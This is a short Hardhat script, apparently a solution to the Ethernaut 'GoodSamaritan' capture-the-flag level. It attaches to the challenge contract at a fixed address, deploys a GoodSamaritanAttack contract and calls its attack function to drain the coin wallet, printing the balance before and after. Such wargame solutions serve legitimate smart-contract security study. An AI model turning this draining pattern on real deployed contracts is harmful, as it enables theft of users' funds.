import { ethers } from "hardhat";
import { GoodSamaritan__factory } from "../typechain/factories/contracts/GoodSamaritan.sol/GoodSamaritan__factory";
import { Coin__factory } from "../typechain/factories/contracts/GoodSamaritan.sol/Coin__factory";
import { GoodSamaritanAttack__factory } from "../typechain/factories/contracts/GoodSamaritanAttack__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x421b9E848F2aC67a7AE52732DBe60897225032aa";
    let goodSamaritan = new GoodSamaritan__factory(signer).attach(instance_address);
    let coinAddr = await goodSamaritan.coin();
    let coin = new Coin__factory(signer).attach(coinAddr);
    let walletAddr = await goodSamaritan.wallet();
    console.log(await coin.balances(walletAddr));


    let attack = await new GoodSamaritanAttack__factory(signer).deploy();
    await attack.deployed();

    let tx = await attack.attack(goodSamaritan.address);
    await tx.wait();
    console.log(await coin.balances(walletAddr));

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
